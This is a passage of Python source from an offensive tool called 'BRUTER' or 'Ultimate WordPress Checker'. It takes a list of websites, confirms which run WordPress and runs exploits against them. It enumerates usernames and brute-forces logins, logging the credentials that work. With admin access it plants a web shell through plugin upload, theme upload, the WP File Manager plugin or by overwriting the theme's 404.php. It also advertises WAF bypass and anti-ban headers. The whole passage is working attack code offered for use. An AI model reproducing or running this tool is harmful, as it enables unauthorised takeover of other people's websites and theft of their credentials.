                    failure_reasons.append("wp-admin not active")
                if login_indicators_found < 2:
                    failure_reasons.append(f"only {login_indicators_found} login indicators")
                if not dashboard_verified:
                    failure_reasons.append("dashboard not verified")
                    
                print(' -| ' + url + ' --> ' + Fore.RED + f'[Login failed: {", ".join(failure_reasons)}]')
                return False, None, None
                
        except Exception as e:
            print(' -| ' + url + ' --> ' + Fore.RED + f'[Login check error: {str(e)[:50]}]')
            return False, None, None

    def upload_random_plugin(self, url, session):
        """Upload shell via random plugin"""    
        try:
            foldername = self.random_string(7)
            
            plugin_page = session.get(url + '/wp-admin/plugin-install.php?tab=upload',
                                    headers=self.get_random_headers(), timeout=15, verify=False)
            plugin_content = self.content_from_response(plugin_page)
            
            nonce_match = re.findall(r'id="_wpnonce" name="_wpnonce" value="(.*?)"', plugin_content)
            if not nonce_match:
                return None
                
            nonce = nonce_match[0]
            
            if not os.path.exists('Files/plugin.zip'):
                return None
                
            filedata = {
                '_wpnonce': nonce,
                '_wp_http_referer': '/wp-admin/plugin-install.php?tab=upload',
                'install-plugin-submit': 'Install Now'
            }
            
            files = {
                'pluginzip': (foldername + '.zip', open('Files/plugin.zip', 'rb'), 'multipart/form-data')
            }
            
            upload_resp = session.post(url + '/wp-admin/update.php?action=upload-plugin',
                                    data=filedata, files=files, headers=self.get_random_headers(),
                                    timeout=60, verify=False)
                                    
            shell_url = url + '/wp-content/plugins/' + foldername + '/shell.php'
            check_resp = requests.get(shell_url, headers=self.get_random_headers(), timeout=10, verify=False)
            
            if check_resp.status_code == 200 and 'Hackfut Security Web Shell' in check_resp.text:
                return shell_url
            return None
        except:
            return None

    def upload_wp_file_manager(self, url, session):
        """Upload wp file manager via WP File Manager plugin"""
        try:
            filename = self.random_string(8) + '.php'
            if not os.path.exists('Files/index.php'):
                return None
            with open('Files/index.php', 'r') as f:
                shell_content = f.read()
            fm_page = session.get(url + '/wp-admin/plugin-install.php?s=File+Manager&tab=search&type=term',
                                headers=self.get_random_headers(), timeout=15, verify=False)
            fm_content = self.content_from_response(fm_page)
            if 'admin.php?page=wp_file_manager' in fm_content:
                admin_page = session.get(url + '/wp-admin/admin.php?page=wp_file_manager#elf_ll_Lw',
                                        headers=self.get_random_headers(), timeout=15, verify=False)
                admin_content = self.content_from_response(admin_page)
                
                nonce_match = re.findall(r'admin-ajax.php","nonce":"(.*?)","lang"', admin_content)
                if nonce_match:
                    nonce = nonce_match[0]
                    files = {'upload[]': (filename, shell_content, 'multipart/form-data')}
                    data = {
                        '_wpnonce': nonce,
                        'action': 'mk_file_folder_manager',
                        'cmd': 'upload',
                        'target': 'll_Lw'
                    }
                    
                    upload_resp = session.post(url + '/wp-admin/admin-ajax.php',
                                            data=data, files=files, headers=self.get_random_headers(),
                                            timeout=60, verify=False)
                                            
                    shell_url = url + '/' + filename
                    check_resp = requests.get(shell_url, headers=self.get_random_headers(), timeout=10, verify=False)
                    
                    if check_resp.status_code == 200 and 'Hackfut Security Web Shell' in check_resp.text:
                        return shell_url
            return None
        except:
            return None
            
    def upload_random_theme(self, url, session):
        """Upload shell via random theme"""    
        try:
            foldername = self.random_string(7)
            
            theme_page = session.get(url + '/wp-admin/theme-install.php?tab=upload',
                                    headers=self.get_random_headers(), timeout=15, verify=False)
            theme_content = self.content_from_response(theme_page)
            
            nonce_match = re.findall(r'id="_wpnonce" name="_wpnonce" value="(.*?)"', theme_content)
            if not nonce_match:
                return None
                
            nonce = nonce_match[0]
            
            if not os.path.exists('Files/theme.zip'):
                return None
                
            filedata = {
                '_wpnonce': nonce,
                '_wp_http_referer': '/wp-admin/theme-install.php?tab=upload',
                'install-theme-submit': 'Install Now'
            }
            
            files = {
                'themezip': (foldername + '.zip', open('Files/theme.zip', 'rb'), 'multipart/form-data')
            }
            
            upload_resp = session.post(url + '/wp-admin/update.php?action=upload-theme',
                                    data=filedata, files=files, headers=self.get_random_headers(),
                                    timeout=60, verify=False)
                                    
            shell_url = url + '/wp-content/themes/' + foldername + '/shell.php'
            check_resp = requests.get(shell_url, headers=self.get_random_headers(), timeout=10, verify=False)
            
            if check_resp.status_code == 200 and 'Hackfut Security Web Shell' in check_resp.text:
                return shell_url
            return None
        except:
            return None
            
    def upload_via_theme_editor(self, url, session):
        """Upload shell via theme editor (404.php)"""
        try:
            editor_page = session.get(url + '/wp-admin/theme-editor.php?file=404.php',
                                    headers=self.get_random_headers(), timeout=30, verify=False)

            editor_content = self.content_from_response(editor_page)

            if 'theme-editor.php' not in editor_content or 'Update File' not in editor_content:
                return None

            nonce_match = re.findall(r'name="wpnonce" value="([^"]+)"', editor_content)
            if not nonce_match:
                return None

            nonce = nonce_match[0]

            theme_match = re.findall(r'name="theme" value="([^"]+)"', editor_content)
            if not theme_match:
                theme_match = re.findall(r'theme=([^&]+)', editor_content)
                if not theme_match:
                    return None

            theme_name = theme_match[0]

            if not os.path.exists('Files/index.php'):
                return None

            with open('Files/index.php', 'r') as f:
                shell_content = f.read()

            post_data = {
                'wpnonce': nonce,
                '_wp_http_referer': '/wp-admin/theme-editor.php?file=404.php&theme=' + theme_name,
                'newcontent': shell_content,
                'action': 'edit-theme-plugin-file',
                'file': '404.php',
                'theme': theme_name,
                'docs-list': ''
            }
            
            update_resp = session.post(url + '/wp-admin/admin-ajax.php',
                                data=post_data, headers=self.get_random_headers(),
                                timeout=30, verify=False)
        
            shell_urls = {
                url + '/404.php',
                url + '/wp-content/themes/' + theme_name + '/404.php'
            }

            for shell_url in shell_urls:
                check_resp = requests.get(shell_url, headers=self.get_random_headers(), timeout=10, verify=False)
                if check_resp.status_code == 200 and 'Hackfut Security Web Shell'  in check_resp.text:
                    return shell_url

            return None
        except:
            return None
            
    def try_all_upload_methods(self, url, session):
        """Try all upload methods"""
        upload_methods = [
            ('Plugin Upload', self.upload_random_plugin),
            ('File Manager', self.upload_wp_file_manager),
            ('Theme Upload', self.upload_random_theme),
            ('Theme Editor', self.upload_via_theme_editor)
        ]

        for method_name, method_func in upload_methods:
            print(' -| ' + url + ' --> ' + self.fw + '[Trying ' + method_name + '...]')
            shell_url = method_func(url, session)
            if shell_url:
                print(' -| ' + url + ' --> ' + self.fg + '[SUCCESS: ' + method_name + ']')
                return shell_url
            else:
                print(' -| ' + url + ' --> ' + self.fr + '[Failed: ' + method_name + ']')

        return None

    def bruteforce_site(self, site):
        """Main bruteforce function - MODIFIÉE avec détection approfondie et exploits"""
        url = self.normalize_url(site)
        domain = self.extract_domain(url)

        if not domain:
            print('[-] ' + url + ' --> ' + self.fr + '[Invalid URL]')
            return

        # DNS check avec meilleure gestion d'erreurs
        try:
            socket.setdefaulttimeout(5)
            ip = socket.gethostbyname(domain.split(':')[0])
        except socket.gaierror:
            try:
                ip = socket.gethostbyname('www.' + domain.split(':')[0])
                url = url.replace(domain, 'www.' + domain)
                domain = 'www.' + domain
            except:
                print('[-] ' + url + ' --> ' + self.fr + '[DNS Failed - Skipping]')
                return
        except socket.timeout:
            print('[-] ' + url + ' --> ' + self.fr + '[DNS Timeout - Skipping]')
            return
        except Exception as e:
            print('[-] ' + url + ' --> ' + self.fr + '[DNS Error - Skipping]')
            return
        finally:
            socket.setdefaulttimeout(None)

        with self.lock:
            self.stats['total'] += 1

        # DÉTECTION WORDPRESS APPROFONDIE
        session = create_session()
        is_wp, wp_indicators, login_url = advanced_wordpress_detection(url, session)

        if not is_wp:
            print(' -| ' + url + ' --> ' + self.fr + '[Not WordPress - Only ' + str(len(wp_indicators)) + ' indicators]')
            return

        with self.lock:
            self.stats['wordpress'] += 1

        resolved_login, waf_bypass = resolve_wordpress_login_url(url, session, self.get_random_headers())
        if resolved_login:
            login_url = resolved_login
            if waf_bypass:
                print(' -| ' + url + ' --> ' + self.fy + f'[WAF BYPASS: using {login_url}]')
        
        print(' -| ' + url + ' --> ' + self.fg + f'[WordPress Confirmed! Indicators: {", ".join(wp_indicators)}]')

        # PHASE 1: EXÉCUTER TOUS LES EXPLOITS WORDPRESS
        print(' -| ' + url + ' --> ' + self.fc + '[PHASE 1: Running WordPress Exploits...]')
        successful_exploits = execute_all_wordpress_exploits(url)
        
        if successful_exploits:
            print(' -| ' + url + ' --> ' + self.fg + f'[EXPLOITS SUCCESS: {len(successful_exploits)} exploits worked!]')
            with self.lock:
                self.stats['successful'] += len(successful_exploits)
            
            # Si on a déjà des shells, on peut arrêter ici
            shell_results = [result for name, result in successful_exploits if 'shell.php' in str(result) or '.php' in str(result)]
            if shell_results:
                print(' -| ' + url + ' --> ' + self.fg + '[SHELL OBTAINED via exploits - skipping brute force]')
                return

        # PHASE 2: BRUTE FORCE (seulement si les exploits ont échoué)
        print(' -| ' + url + ' --> ' + self.fc + '[PHASE 2: Starting Brute Force...]')

        # Extraire les usernames réels si possible
        print(' -| ' + url + ' --> ' + self.fy + '[Extracting Usernames...]')
        found_usernames = self.extract_usernames(url, session)

        if found_usernames:
            print(' -| ' + url + ' --> ' + self.fg + '[Found ' + str(len(found_usernames)) + ' real usernames!]')
            with self.lock:
                self.stats['usernames_found'] += len(found_usernames)

        # Générer les credentials avec les usernames trouvés (INCLUANT LA NOUVELLE TECHNIQUE)
        all_creds = self.generate_smart_credentials(domain, found_usernames)

        # Supprimer les doublons
        seen = set()
        unique_creds = []
        for cred in all_creds:
            if cred not in seen:
                seen.add(cred)
                unique_creds.append(cred)

        print(' -| ' + url + ' --> ' + self.fw + '[Testing ' + str(len(unique_creds)) + ' credentials...]')
        
        # Essayer les credentials - avec limite intelligente basée sur les usernames trouvés
        max_attempts = 35 if found_usernames else 25
        success = False
        found_username = None
        found_password = None

        for i, (username, password) in enumerate(unique_creds):
            if i > max_attempts:
                print(' -| ' + url + ' --> ' + self.fy + '[Stopping - tried top ' + str(max_attempts) + ' passwords]')
                break

            # Afficher les tentatives avec la nouvelle technique
            if '@' in password and domain in password:
                print(' -| ' + url + ' --> ' + self.fc + f'[Testing NEW TECHNIQUE: {username}:{password}]')

            success, found_username, found_password = self.simple_login_check(
                session, url, username, password, login_url
            )

            if success:
                break

        if success:
            with self.lock:
                self.stats['successful'] += 1

            # CORRECTION: Utiliser found_username et found_password au lieu de username_used et password_used
            result = url + '/wp-login.php#' + found_username + '@' + found_password
            with self.lock:
                with open(self.output_dir + '/successfully_logged_WordPress.txt', 'a', encoding='utf-8') as f:
                    f.write(result + '\n')

            print(' -| ' + url + self.fg + ' --> BRUTE FORCE SUCCESS: ' + found_username + ':' + found_password)

            # Vérification rapide des capacités
            admin_check = session.get(url + '/wp-admin/', timeout=5, verify=False)
            if admin_check.status_code == 200:
                admin_content = admin_check.text
                
                if not all(x in admin_content for x in ['div id="wp', 'admin']):
                    print(' -| ' + url + self.fr + ' -> Invalid admin panel - skipping')
                    return

                if any(x in admin_content.lower() for x in ['plugin', 'add new']):
                    with self.lock:
                        with open(self.output_dir + '/plugin-install.txt', 'a') as f:
                            f.write(result + '\n')
                    print(' -| ' + url + self.fg + ' -> Plugin Access')

                if 'file manager' in admin_content.lower():
                    with self.lock:
                        with open(self.output_dir + '/filemanager.txt', 'a') as f:
                            f.write(result + '\n')
                    print(' -| ' + url + self.fg + ' -> File Manager')

                admin_keywords = ['themes', 'plugins', 'users', 'settings', 'tools']
                if sum(1 for k in admin_keywords if k in admin_content.lower()) >= 3:
                    with self.lock:
                        with open(self.output_dir + '/full-admin-confirmed.txt', 'a') as f:
                            f.write(result + '\n')
                    print(' -| ' + url + self.fg + ' -> Admin Access')

                    # Essayer d'uploader un shell
                    print(' -| ' + url + ' --> ' + self.fw + '[Attempting shell upload...]')               
                    shell_url = self.try_all_upload_methods(url, session)

                    if shell_url:
                        with self.lock:
                            self.stats['shells'] += 1
                            with open(self.output_dir + '/Shells.txt', 'a', encoding='utf-8') as f:
                                f.write(shell_url + '\n')
                        print(' -| ' + shell_url + ' --> ' + self.fg + '[Shell Uploaded!]')
                    else:
                        print(' -| ' + url + ' --> ' + self.fr + '[Shell upload failed!]')
        else:
            with self.lock:
                self.stats['failed'] += 1
            print(' -| ' + url + ' --> ' + self.fr + '[Brute Force Failed!]')

        # Résumé final du site
        if successful_exploits or success:
            print(' -| ' + url + ' --> ' + self.fg + '[SITE COMPROMISED!]')
        else:
            print(' -| ' + url + ' --> ' + self.fr + '[SITE SECURE - No vulnerabilities found]')

    def process_site(self, site):
        """Process wrapper with error handling"""
        try:
            site = site.strip()
            if site:
                self.bruteforce_site(site)
        except Exception as e:
            print(' -| Error processing ' + site + ': ' + str(e)[:50] + '...')
            
    def run(self, input_file):
        """Run the ultimate checker"""
        try:
            # Read sites
            with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
                sites = [line.strip() for line in f if line.strip()]

            if not sites:
                print("[!] No sites found in file")
                return
            
            # Check for required files
            required_files = ['Files/plugin.zip', 'Files/theme.zip', 'Files/index.php']
            missing_files = [f for f in required_files if not os.path.exists(f)]

            if missing_files:
                print(self.fr + '[!] Warning: Missing required files:')
                for f in missing_files:
                    print('    - ' + f)
                print(self.fy + '[!] Upload functionality may not work properly!')
                print(self.fy + '[!] Please add the required files to the Files directory.')
                print("")
                
            print("""
┌─────────────────────────────────────────────────────────┐
│ ULTIMATE WORDPRESS CHECKER v3.0 - FINAL EDITION         │
│                 WITH SHELL UPLOAD                       │
├─────────────────────────────────────────────────────────┤
│ [+] Sites Loaded      : """ + str(len(sites)).ljust(37) + """│
│ [+] Threads           : """ + str(self.threads).ljust(37) + """│
│ [+] Username Extract  : ENABLED (Author ID + REST API)  │
│ [+] Smart Headers     : ENABLED (Anti-Ban)              │
│ [+] Shell Upload      : ENABLED (4 Methods)             │
│ [+] Fast Mode         : 25-35 attempts per site         │
│ [+] DNS Smart Check   : ENABLED (with WWW fallback)     │
│ [+] Admin Verify      : STRICT (100% accurate)          │
│ [+] NEW TECHNIQUE     : @domain passwords ENABLED       │
│ [+] Output Directory  : """ + self.output_dir.ljust(37) + """│
└─────────────────────────────────────────────────────────┘
          """)
            print('\n' + self.fg + '[*] Starting Ultimate Bruteforce Attack with Shell Upload...\n')

            # Process with thread pool
            start_time = time.time()

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(self.process_site, site) for site in sites]
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        print(f"Error in thread: {e}")

            # Show statistics
            elapsed = time.time() - start_time
            elapsed_str = "{:.2f} seconds".format(elapsed)
            success_rate = "{:.1f}%".format((self.stats['successful']/max(self.stats['wordpress'],1))*100)

            print("""
┌─────────────────────────────────────────────────────────┐
│                 FINAL STATISTICS                        │
├─────────────────────────────────────────────────────────┤
│ [*] Total Sites         : """ + str(self.stats['total']).ljust(37) + """│
│ [*] Wordpress Found     : """ + str(self.stats['wordpress']).ljust(37) + """│
│ [*] Usernames Found     : """ + str(self.stats['usernames_found']).ljust(37) + """│
│ """ + self.fg + """[+] Successful          : """ + str(self.stats['successful']).ljust(37) + self.fw + """│
│ """ + self.fg + """[+] Shells Uploaded     : """ + str(self.stats['shells']).ljust(37) + self.fw + """│
│ """ + self.fr + """[X] Failed              : """ + str(self.stats['failed']).ljust(37) + self.fw + """│
│ [*] Time Elapsed        : """ + elapsed_str.ljust(37) + """│
│ [*] Success Rate        : """ + success_rate.ljust(37) + """│
└─────────────────────────────────────────────────────────┘
            """)
           
            # Show result files
            print('\n' + self.fg + '[+] Results saved in ' + self.output_dir + '/')

            files = [
                'successfully_logged_WordPress.txt',
                'Shells.txt',
                'plugin-install.txt',
                'filemanager.txt',
                'full-admin-confirmed.txt'
            ]

            for filename in files:
                filepath = os.path.join(self.output_dir, filename)
                if os.path.exists(filepath):
                    with open(filepath, 'r') as f:
                        count = len(f.readlines())
                    if count > 0:
                        print(' |_ ' + filename + ' : ' + str(count) + ' entries')

        except Exception as e:
            print('\n' + self.fr + '[!] Fatal Error: ' + str(e))
            import traceback
            traceback.print_exc()
            
if __name__ == "__main__":
    try:
        print("""
  ██████╗░██████╗░██╗░░░██╗████████╗███████╗
  ██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝
  ██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░
  ██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░
  ██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗
  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝
        """)

        if len(sys.argv) < 2:
            print("\nUsage: python BRUTER.py <sites.txt>")
            print("\nFile format - one site per line:")
            print(" example.com")
            print(" http://example.com")
            print(" https://www.example.com")
            print("\nThe tool will automatically extract usernames, test credentials,")
            print("and upload shells to successfully accessed sites!")
            print("\nRequired files in 'Files' directory:")
            print(" - plugin.zip (WordPress plugin with shell)")
            print(" - theme.zip (WordPress theme with shell)")
            print(" - index.php (Shell file)")
            print("\nNEW FEATURE: Automatic @domain password generation for found usernames!")
            sys.exit(1)
            
        checker = UltimateWPChecker(threads=30)
        checker.run(sys.argv[1])
        
    except KeyboardInterrupt:
        print('\n' + Fore.YELLOW + '[!] Process interrupted by user')
    except Exception as e:
        print('\n' + Fore.RED + '[!] Critical Error: ' + str(e))
        import traceback
        traceback.print_exc()